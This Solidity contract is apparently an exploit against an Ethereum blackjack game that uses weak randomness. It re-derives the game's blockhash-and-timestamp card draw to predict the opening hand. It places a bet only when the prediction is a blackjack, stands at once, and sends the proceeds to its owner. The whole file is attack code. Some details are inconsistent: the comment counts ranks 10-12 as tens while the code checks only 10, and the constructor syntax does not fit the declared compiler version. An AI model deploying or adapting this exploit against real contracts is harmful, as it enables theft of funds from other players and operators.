// SPDX-License-Identifier: MIT
pragma solidity ^0.4.9;

interface IBlackJack {
    function deal() external payable;
    function stand() external;
    function getPlayerCard(uint8 id) external constant returns (uint8);
    function getHouseCard(uint8 id) external constant returns (uint8);
    function getGameState() external constant returns (uint8);
    function getPlayerCardsNumber() external constant returns (uint);
}

contract BlackJackExploit {
    address public owner;
    IBlackJack public target;

    constructor(address _target) public {
        owner = msg.sender;
        target = IBlackJack(_target);
    }

    function () public payable {}

    // Helper: mimic the vulnerable randomness logic
    function predictCard(address player, uint8 cardNumber) public view returns (uint8) {
        uint256 b = block.number;
        uint256 t = block.timestamp;
        return uint8(uint256(keccak256(block.blockhash(b), player, cardNumber, t)) % 52);
    }

    // Exploit routine: simulate, then play if favorable
    function executeExploit() public payable {
        require(msg.sender == owner);
        require(msg.value >= 50 finney && msg.value <= 5 ether); // obey min/max bet

        // Simulate draw to check if we get blackjack
        uint8 card1 = predictCard(address(this), 0);
        uint8 card2 = predictCard(address(this), 2);

        uint8 v1 = card1 / 4;
        uint8 v2 = card2 / 4;

        // Looking for Blackjack: (1 = Ace, 10-12 = 10s)
        bool isBlackjack = (
            (v1 == 1 && v2 == 10) || 
            (v2 == 1 && v1 == 10)
        );

        if (isBlackjack) {
            // Place bet and start game
            target.deal.value(msg.value)();

            // Immediately stand to claim win
            target.stand();

            // Funds should be returned automatically if player wins
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}

